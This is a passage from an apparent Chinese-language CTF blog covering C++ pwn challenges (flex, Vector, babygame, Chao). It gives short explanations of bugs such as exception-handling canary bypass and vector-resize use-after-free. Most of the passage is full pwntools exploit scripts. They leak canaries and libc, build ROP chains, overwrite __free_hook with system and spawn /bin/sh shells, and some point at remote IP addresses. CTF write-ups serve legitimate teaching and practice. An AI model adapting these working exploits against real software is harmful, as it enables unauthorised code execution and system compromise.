class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value2 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value2)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1) + p64(stack_value2))<br><br>elf_base = stack_value2 - <span class="hljs-number">0x39a0</span><br>pop_rdi = elf_base + <span class="hljs-number">0x000000000000ea73</span><br>main = elf_base + <span class="hljs-number">0x49f3</span><br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value3 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value3)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf_base + elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(main)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000096c3</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="DCTF2017-flex🤪"><a href="#DCTF2017-flex🤪" class="headerlink" title="DCTF2017 flex🤪"></a>DCTF2017 flex🤪</h2><p>作为一个没打过OI，更不会C++的蒻笱，异常处理这玩意直接涉及到笔者盲区了。</p><p>首先这题不能说是一个纯种的C++ pwn题，只能说是一个C和C++的<del>杂种</del>杂修~~</p><p>IDA打开，选项4很诱人，但仔细一看基本上利用不了，难受，就像打了脚没🐍出来一样难受😰</p><p>然后选项3是个FW，👴只能看function1&amp;2了</p><p><img src="/img/C++/6.png" alt="img"></p><p>很明显的负数溢出，然后可以栈溢出嘿嘿嘿，但是这玩意有个canary，bad，这比🐍不出来还要难受🥵</p><p>但是很明显这个func里存在奇怪的东西，throw，👴感觉这玩意有问题，但是👴8知道哪里有问题。</p><p><img src="/img/C++/7.png" alt="img"></p><p>摸不出来的👴只能去网上冲浪，卑微的窝在阴暗的下水道里读着大跌们的wp</p><p>然后👴明白啦</p><h3 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h3><p>try、throw、catch这三个卧龙凤雏总是一起出现</p><p>Throw抛出异常，try 包含异常模块，catch 捕捉抛出的异常</p><p>当程序throw一个异常的时候，基本流程是这样的喵</p><p>1、调用 __cxa_allocate_exception 函数，分配一个异常对象。</p><p><img src="/img/C++/8.png" alt="img"></p><p>2、调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</p><p><img src="/img/C++/9.png" alt="img"></p><p>3、__cxa_throw() 调用 _Unwind_RaiseException() 从而开始 unwind（unwind“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。）。</p><p><img src="/img/C++/10.png" alt="img"></p><p>4、_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</p><p>5、如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</p><p>6、_Unwind_RaiseException() 将控制权转到相应的catch代码。</p><p>然后👴就发现异常处理后👴就来到了一个奇怪的地方</p><p><img src="/img/C++/11.png" alt="img"></p><p>仔细一看，欸，原来function1里的try和catch模块反编译时并没有出来。</p><p>那这么一说，👴从孙子函数跳到了儿子函数并且没有经过canary的check，win！！</p><p>那么问题来了，该怎么食用这个漏洞捏。</p><p>6年前爹爹们的思路是：如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了。</p><p>妙，实在是妙啊。</p><p>PS：返回地址一定要填try和catch之间的地址（只有这样才能被捕获异常）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./flex&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./flex&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>pop_rdi = <span class="hljs-number">0x00000000004044d3</span><br>ret = <span class="hljs-number">0x0000000000400ba9</span><br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;no&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">2</span>).encode())<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x40134f\nc\n&quot;</span>)<br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span> + p64(<span class="hljs-number">0x6061c0</span>) + p64(<span class="hljs-number">0x401512</span>)<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,paylaod)<br><br>payload = flat([<br>    <span class="hljs-number">0x4044ca</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<span class="hljs-number">0x100</span>,<span class="hljs-number">0x606260</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x4044b0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>])<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>payload = p64(<span class="hljs-number">0xe3afe</span>+libc.address)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>爽啊，果然还是🐍出来才是最爽的啊😋</p><h2 id="hgame2022-Vector😎"><a href="#hgame2022-Vector😎" class="headerlink" title="hgame2022 Vector😎"></a>hgame2022 Vector😎</h2><p>跟vector容器有关的一道菜单堆</p><p>多了一个move function，那问题肯定在里面。</p><p><img src="/img/C++/12.png" alt="img"></p><p>当move输入的nex_idx过大时，resize会申请一个更大的chunk，并把原来chunk中的数据复制过去。可以看到，这个操作是在note[idx]</p><p>&#x3D; nullptr之前，因此note[idx] &#x3D; nullptr实际上是在给已经废弃的note中的idx置0。这样便能造成UAF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vector&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./vector&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">new_index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(new_index).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(<span class="hljs-number">7</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc70</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>move(<span class="hljs-number">10</span>)<br>move(<span class="hljs-number">9</span>)<br><br>move(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">8</span>)<br>gdb.attach(p)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CTF-2021-babygame🤮"><a href="#CTF-2021-babygame🤮" class="headerlink" title="*CTF 2021 babygame🤮"></a>*CTF 2021 babygame🤮</h2><p>逆个🐕8，🧠要炸了</p><p>👴一开始觉得👴把9个关卡通关了👴就win了，8就是玩游戏🐎，👴在行，so easy</p><p>然后就没有然后了，👴对着IDA那坨屎山代码看了两个小时看不出来，👴摆了，润</p><p>后来👴想着fuzz试试，结果这个🐕8glibc是glibc-2.27 ubuntu1.2的版本，tcache里还莫得check，tcache 的double free根本8会报错，妈妈生的。</p><p>👴🏳️，钻进👴在下水道阴暗的小窝里看A3👴的wp，👴好奇A3👴是怎么调出来完成一个关卡后，选定一个关卡，然后退出会造成UAF的。</p><p>然后就很简单了，string可以申请任意大小的chunk，配合tcache double free 打free_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babygame&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">x</span>):<br>    sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>    cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;korey0sh1&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;l&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>decode()<br>cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CATCTF-2022-Chao🛏️💤"><a href="#CATCTF-2022-Chao🛏️💤" class="headerlink" title="CATCTF 2022 Chao🛏️💤"></a>CATCTF 2022 Chao🛏️💤</h2><p>winmt👴出的C++ Pwn</p><p>逆吐啦🤮🤮🤮🤮</p><p>Create里有0和1两种type，但观察update和show功能后，就能发现这两个功能只适配type0。然后看看两种type不同的虚表函数，就发现update type1能直接伪造size和show的基址，便可以任意地址读。</p><p>存在栈溢出漏洞，然后用0xfffffff7+0xa-1这种补码漏洞来触发C++异常处理绕过canary check</p><p><img src="/img/C++/13.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;chao&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span 